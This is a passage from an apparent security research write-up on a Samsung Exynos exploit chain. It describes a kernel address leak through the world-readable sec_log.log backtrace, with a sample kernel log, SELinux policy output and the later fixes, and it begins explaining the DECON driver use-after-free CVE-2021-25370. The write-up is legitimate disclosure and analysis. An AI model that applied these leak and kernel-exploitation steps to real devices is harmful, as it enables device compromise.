 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; </span><span class="vdnyYxSRCi-c0">*(</span><span class="vdnyYxSRCi-c5">char</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">**)((</span><span class="vdnyYxSRCi-c5">char</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">*)&amp;</span><span class="vdnyYxSRCi-c4">s </span><span class="vdnyYxSRCi-c0">+</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">*(</span><span class="vdnyYxSRCi-c5">char</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">**)</span><span class="vdnyYxSRCi-c18">&quot;DUMPSTATE&quot;</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; </span><span class="vdnyYxSRCi-c12">DurationReporter</span><span class="vdnyYxSRCi-c0">::</span><span class="vdnyYxSRCi-c12">DurationReporter</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">v636</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">__int64</span><span class="vdnyYxSRCi-c0">)&amp;</span><span class="vdnyYxSRCi-c4">s</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">((</span><span class="vdnyYxSRCi-c5">unsigned</span><span class="vdnyYxSRCi-c4">&nbsp;__int8</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">s </span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">!=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">operator</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">delete</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">v650</span><span class="vdnyYxSRCi-c0">[</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">]);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp; dump_sec_log</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(</span><span class="vdnyYxSRCi-c18 vdnyYxSRCi-c9">&quot;SEC LOG&quot;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c18 vdnyYxSRCi-c9">&quot;/proc/sec_log&quot;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">,</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c18 vdnyYxSRCi-c9">&quot;/data/log/sec_log.log&quot;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">);</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>After starting the </span><span class="vdnyYxSRCi-c2">bugreport</span><span>&nbsp;service, the exploit uses </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://man7.org/linux/man-pages/man7/inotify.7.html">inotify</a></span><span>&nbsp;to monitor for </span><span class="vdnyYxSRCi-c2">IN_CLOSE_WRITE</span><span>&nbsp;events in the </span><span class="vdnyYxSRCi-c2">/data/log/</span><span>&nbsp;directory. </span><span class="vdnyYxSRCi-c2">IN_CLOSE_WRITE</span><span>&nbsp;triggers when a file that was opened for writing is closed. So this watch will occur when </span><span class="vdnyYxSRCi-c2">dumpstate</span><span>&nbsp;is finished writing to </span><span class="vdnyYxSRCi-c2">sec_log.log</span><span>.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>An example of the </span><span class="vdnyYxSRCi-c2">sec_log.log</span><span>&nbsp;file contents generated after hitting the </span><span class="vdnyYxSRCi-c2">WARN_ON</span><span>&nbsp;statement is shown below. The exploit combs through the file contents looking for two values on the stack that are at address </span><span class="vdnyYxSRCi-c2">*b60</span><span>&nbsp;and </span><span class="vdnyYxSRCi-c2">*bc0</span><span>: the </span><span class="vdnyYxSRCi-c2">task_struct</span><span>&nbsp;and the </span><span class="vdnyYxSRCi-c2">sys_call_table</span><span class="vdnyYxSRCi-c7">&nbsp;address.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.b661857298a41a556dd5123b1b902d7684a5d3bb"></a><a id="t.13"></a><table class="vdnyYxSRCi-c47"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c48" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635627] &nbsp;[4: &nbsp; &nbsp;poc:25943] ------------[ cut here ]------------</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635654] &nbsp;[4: &nbsp; &nbsp;poc:25943] WARNING: CPU: 4 PID: 25943 at drivers/gpu/arm/b_r19p0/mali_kbase_vinstr.c:992 kbasep_vinstr_hwcnt_reader_ioctl+0x36c/0x664</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635663] &nbsp;[4: &nbsp; &nbsp;poc:25943] Modules linked in:</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635675] &nbsp;[4: &nbsp; &nbsp;poc:25943] CPU: 4 PID: 25943 Comm: poc Tainted: G &nbsp; &nbsp; &nbsp; &nbsp;W &nbsp; &nbsp; &nbsp; 4.14.113-20034833 #1</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635682] &nbsp;[4: &nbsp; &nbsp;poc:25943] Hardware name: Samsung BEYOND1LTE EUR OPEN 26 board based on EXYNOS9820 (DT)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635689] &nbsp;[4: &nbsp; &nbsp;poc:25943] Call trace:</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635701] &nbsp;[4: &nbsp; &nbsp;poc:25943] [&lt;0000000000000000&gt;] dump_backtrace+0x0/0x280</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635710] &nbsp;[4: &nbsp; &nbsp;poc:25943] [&lt;0000000000000000&gt;] show_stack+0x18/0x24</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635720] &nbsp;[4: &nbsp; &nbsp;poc:25943] [&lt;0000000000000000&gt;] dump_stack+0xa8/0xe4</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635731] &nbsp;[4: &nbsp; &nbsp;poc:25943] [&lt;0000000000000000&gt;] __warn+0xbc/0x164tv</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635738] &nbsp;[4: &nbsp; &nbsp;poc:25943] [&lt;0000000000000000&gt;] report_bug+0x15c/0x19c</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635746] &nbsp;[4: &nbsp; &nbsp;poc:25943] [&lt;0000000000000000&gt;] bug_handler+0x30/0x8c</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635753] &nbsp;[4: &nbsp; &nbsp;poc:25943] [&lt;0000000000000000&gt;] brk_handler+0x94/0x150</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635760] &nbsp;[4: &nbsp; &nbsp;poc:25943] [&lt;0000000000000000&gt;] do_debug_exception+0xc8/0x164</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635766] &nbsp;[4: &nbsp; &nbsp;poc:25943] Exception stack(0xffffff8014c2bb40 to 0xffffff8014c2bc80)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635775] &nbsp;[4: &nbsp; &nbsp;poc:25943] bb40: ffffffc91b00fa40 000000004004befe 0000000000000000 0000000000000000</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&lt;4&gt;[90808.635781] &nbsp;[4: &nbsp; &nbsp;poc:25943] bb60: </span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">ffffffc061b65800</span><span class="vdnyYxSRCi-c3">&nbsp;000000000ecc0408 000000000000000a 000000000000000a</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635789] &nbsp;[4: &nbsp; &nbsp;poc:25943] bb80: 000000004004be30 000000000000be00 ffffffc86b49d700 000000000000000b</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635796] &nbsp;[4: &nbsp; &nbsp;poc:25943] bba0: ffffff8014c2bdd0 0000000080000000 0000000000000026 0000000000000026</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&lt;4&gt;[90808.635802] &nbsp;[4: &nbsp; &nbsp;poc:25943] bbc0: </span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">ffffff8008429834</span><span class="vdnyYxSRCi-c3">&nbsp;000000000041bd50 0000000000000000 0000000000000000</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635809] &nbsp;[4: &nbsp; &nbsp;poc:25943] bbe0: ffffffc88b42d500 ffffffffffffffea ffffffc96bda5bc0 0000000000000004</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635816] &nbsp;[4: &nbsp; &nbsp;poc:25943] bc00: 0000000000000000 0000000000000124 000000000000001d ffffff8009293000</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635823] &nbsp;[4: &nbsp; &nbsp;poc:25943] bc20: ffffffc89bb6b180 ffffff8014c2bdf0 ffffff80084294bc ffffff8014c2bd80</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635829] &nbsp;[4: &nbsp; &nbsp;poc:25943] bc40: ffffff800885014c 0000000020400145 0000000000000008 0000000000000008</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c3">&lt;4&gt;[90808.635836] &nbsp;[4: &nbsp; &nbsp;poc:25943] bc60: 0000007fffffffff 0000000000000001 ffffff8014c2bdf0 ffffff800885014c</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&lt;4&gt;[90808.635843] &nbsp;[4: &nbsp; &nbsp;poc:25943] [&lt;0000000000000000&gt;] el1_dbg+0x18/0x74</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The file </span><span class="vdnyYxSRCi-c2">/data/log/sec_log.log</span><span>&nbsp;has the SELinux context </span><span class="vdnyYxSRCi-c2">dumplog_data_file</span><span>&nbsp;which is widely accessible to many apps as shown below. The exploit is currently running within the </span><span class="vdnyYxSRCi-c2">SamsungTTS</span><span>&nbsp;app which is the </span><span class="vdnyYxSRCi-c2">system_app</span><span>&nbsp;SELinux context. While the exploit does not have access to </span><span class="vdnyYxSRCi-c2">/dev/kmsg</span><span>&nbsp;due to SELinux access controls, it can access the same contents when they are copied to the </span><span class="vdnyYxSRCi-c2">sec_log.log</span><span class="vdnyYxSRCi-c7">&nbsp;which has more permissive access.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.f01b7aab76bb09bed75d19a610b808d720f8deb7"></a><a id="t.14"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">$ sesearch </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">A </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">t dumplog_data_file </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">c file </span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">p open precompiled_sepolicy </span><span class="vdnyYxSRCi-c0">|</span><span class="vdnyYxSRCi-c3">&nbsp;grep _app</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow aasa_service_app dumplog_data_file</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr ioctl </span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c4">&nbsp;map open read </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow dualdar_app dumplog_data_file</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;append create getattr ioctl </span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c4">&nbsp;map open read rename setattr unlink write </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow platform_app dumplog_data_file</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;append create getattr ioctl </span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c4">&nbsp;map open read rename setattr unlink write </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow priv_app dumplog_data_file</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;append create getattr ioctl </span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c4">&nbsp;map open read rename setattr unlink write </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">allow system_app dumplog_data_file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">:</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">file </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">{</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;append create getattr ioctl </span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c9">lock</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;map open read rename setattr unlink write </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">};</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow teed_app dumplog_data_file</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;append create getattr ioctl </span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c4">&nbsp;map open read rename setattr unlink write </span><span class="vdnyYxSRCi-c0">};</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">allow vzwfiltered_untrusted_app dumplog_data_file</span><span class="vdnyYxSRCi-c0">:</span><span class="vdnyYxSRCi-c4">file </span><span class="vdnyYxSRCi-c0">{</span><span class="vdnyYxSRCi-c4">&nbsp;getattr ioctl </span><span class="vdnyYxSRCi-c5">lock</span><span class="vdnyYxSRCi-c4">&nbsp;map open read </span><span class="vdnyYxSRCi-c0">};</span></p></td></tr></table><h2 class="vdnyYxSRCi-c17 vdnyYxSRCi-c8" id="h.hmfvv1p1wpse"><span class="vdnyYxSRCi-c16">Fixing the vulnerability</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">There were a few different changes to address this vulnerability:</span></p><ul style="padding: 0;" class="c36 lst-kix_hbruetvjkelf-0 start"><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span>Modified the </span><span class="vdnyYxSRCi-c2">dumpstate</span><span>&nbsp;binary on the device &ndash; As of the March 2021 update, dumpstate no longer writes to </span><span class="vdnyYxSRCi-c2">/data/log/sec_log.log</span><span class="vdnyYxSRCi-c7">.</span></li><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span>Removed the </span><span class="vdnyYxSRCi-c2">bugreport</span><span>&nbsp;service from </span><span class="vdnyYxSRCi-c2">dumpstate.rc</span><span class="vdnyYxSRCi-c7">.</span></li></ul>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">In addition there were a few changes made earlier in 2020 that when included would prevent this vulnerability in the future:</span></p><ul style="padding: 0;" class="c36 lst-kix_x9fpm1r5kf6m-0 start"><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span>As mentioned above, in February 2020 ARM had released version r21p0 of the Mali driver which had replaced the </span><span class="vdnyYxSRCi-c2">WARN_ON</span><span>&nbsp;with the more appropriate </span><span class="vdnyYxSRCi-c2">pr_warn</span><span>&nbsp;which does not log a full backtrace. The March 2021 Samsung firmware included updating from version r19p0 of the Mali driver to r26p0 which used </span><span class="vdnyYxSRCi-c2">pr_warn</span><span>&nbsp;instead of </span><span class="vdnyYxSRCi-c2">WARN_ON</span><span class="vdnyYxSRCi-c7">.</span></li><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span>In April 2020, </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/arch/arm64/kernel/traps.c?h=linux-4.14.y&id=6dc0256f802be6bc783fb9542affb48d267f592c">upstream Linux made a change</a></span><span class="vdnyYxSRCi-c7">&nbsp;to no longer include raw stack contents in kernel backtraces.</span></li></ul>
 <p class="c1 c8 c14 c39"><span class="vdnyYxSRCi-c7"></span></p><h1 class="vdnyYxSRCi-c28 vdnyYxSRCi-c8" id="h.9gyws0wgb00m"><span class="vdnyYxSRCi-c31">Vulnerability #3 - Arbitrary kernel read and write</span></h1>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The final vulnerability in the chain (CVE-2021-25370) is a use-after-free of a file struct in the Display and Enhancement Controller (DECON) Samsung driver for the Display Processing Unit (DPU). According to the </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://patchwork.kernel.org/project/dri-devel/patch/1417097460-18403-1-git-send-email-ajaykumar.rs@samsung.com/">upstream commit message</a></span><span class="vdnyYxSRCi-c7">, DECON is responsible for creating the video signals from pixel data. This vulnerability is used to gain arbitrary kernel read and write access. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDPl73oa-7g4YO-V5owrIWmBkxynQqdOD4lgWyubSEx7dg2BoS502R_3o4QZjFfP3gjwoEVNv7__hYBltjZuj5aIq22wdDPg8klVTrahHcwp-TxgHoOkeIerXdOUh2igwrLtPYFBlDqEJdaccmMuV88suhYn9v07QfM3b2NlHZ0zNCux84B4RojB-U/s1213/image1.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDPl73oa-7g4YO-V5owrIWmBkxynQqdOD4lgWyubSEx7dg2BoS502R_3o4QZjFfP3gjwoEVNv7__hYBltjZuj5aIq22wdDPg8klVTrahHcwp-TxgHoOkeIerXdOUh2igwrLtPYFBlDqEJdaccmMuV88suhYn9v07QfM3b2NlHZ0zNCux84B4RojB-U/s1200/image1.png" border="0" alt="Screenshot of the CVE-2021-25370 entry from Samsung&#39;s March 2021 security update. It reads: &amp;quot;SVE-2021-19925 (CVE-2021-25370): Memory corruption in dpu driver &nbsp;Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0), R(11.0) devices with selected Exynos chipsets Reported on: December 12, 2020 Disclosure status: Privately disclosed. An incorrect implementation handling file descriptor in dpu driver prior to SMR Mar-2021 Release 1 results in memory corruption leading to kernel panic. The patch fixes incorrect implementation in dpu driver to address memory corruption." style="max-height: 750px; max-width: 600px;"title="Screenshot of the CVE-2021-25370 entry from Samsung&#39;s March 2021 security update. It reads: &amp;quot;SVE-2021-19925 (CVE-2021-25370): Memory corruption in dpu driver &nbsp;Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0), R(11.0) devices with selected Exynos chipsets Reported on: December 12, 2020 Disclosure status: Privately disclosed. An incorrect implementation handling file descriptor in dpu driver prior to SMR Mar-2021 Release 1 results in memory corruption leading to kernel panic. The patch fixes incorrect implementation in dpu driver to address memory corruption." /></a></span></p><h2 class="vdnyYxSRCi-c8 vdnyYxSRCi-c17" id="h.ueqobjujvt37"><span class="vdnyYxSRCi-c16">Find the PID of android.hardware.graphics.composer</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>To be able to trigger the vulnerability the exploit needs an fd for the driver in order to send ioctl calls. To find the fd, the exploit has to to iterate through the fd </span><span class="vdnyYxSRCi-c2">proc</span><span class="vdnyYxSRCi-c7">&nbsp;directory for the target process. Therefore the exploit first needs to find the PID for the graphics process. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The exploit connects to </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://cs.android.com/android/platform/superproject/+/586af4e17de6b8bf665dc2a1bb61f46fddb326f7:system/logging/logd/main.cpp;l=256">LogReader which listens at</a></span><span>&nbsp;</span><span class="vdnyYxSRCi-c2">/dev/socket/logdr</span><span class="vdnyYxSRCi-c7">. When a client connects to LogReader, LogReader writes the log contents back to the client. The exploit then configures LogReader to send it logs for the main log buffer (0), system log buffer (3), and the crash log buffer (4) by writing back to LogReader via the socket:</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.ead3e3d8bb8dda4abd6611b15560f906e9e1ef80"></a><a id="t.15"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">stream lids</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c13">3</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c13">4</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The exploit then monitors the log contents until it sees the words &lsquo;display&rsquo; or </span><span>&lsquo;SDM&rsquo;</span><span class="vdnyYxSRCi-c7">. Once it finds a &lsquo;display&rsquo; or &lsquo;SDM&rsquo; log entry, the exploit then reads the PID from that log entry.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Now it has the PID of android.hardware.graphics.composer, where </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://source.android.com/docs/core/graphics/hwc">android.hardware.graphics composer is the Hardware Composer HAL</a></span><span class="vdnyYxSRCi-c7">.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Next the exploit needs to find the full file path for the DECON driver. The full file path can exist in a few different places on the filesystem so to find which one it is on this device, the exploit iterates through the </span><span class="vdnyYxSRCi-c2">/proc/&lt;PID&gt;/fd/</span><span>&nbsp;directory looking for any file path that contains &ldquo;</span><span class="vdnyYxSRCi-c2">graphics/fb0</span><span>&rdquo;, the DECON driver. It uses </span><span class="vdnyYxSRCi-c2">readlink</span><span>&nbsp;to find the file path for each </span><span class="vdnyYxSRCi-c2">/proc/&lt;PID&gt;/fd/&lt;fd&gt;</span><span>. The </span><span class="vdnyYxSRCi-c2">semclipboard</span><span class="vdnyYxSRCi-c7">&nbsp;vulnerability (vulnerability #1) is then used to get the raw file descriptor for the DECON driver path. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><h2 class="vdnyYxSRCi-c17 vdnyYxSRCi-c8" id="h.tv7cyox27woi"><span class="vdnyYxSRCi-c16">Triggering the Use-After-Free</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The vulnerability is in the </span><span class="vdnyYxSRCi-c2">decon_set_win_config</span><span>&nbsp;function in the Samsung DECON driver. The vulnerability is a </span><span>relatively common use-after-free pattern in kernel drivers. First, the driver acquires an fd for a </span><span>fence</span><span>. This fd is associated with a file pointer in a </span><span class="vdnyYxSRCi-c2">sync_file</span><span>&nbsp;struct, specifically the </span><span class="vdnyYxSRCi-c2">file</span><span>&nbsp;member. A &ldquo;</span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://www.kernel.org/doc/html/latest/driver-api/sync_file.html">fence</a></span><span class="vdnyYxSRCi-c7">&rdquo; is used for sharing buffers and synchronizing access between drivers and different processes. </span></p>
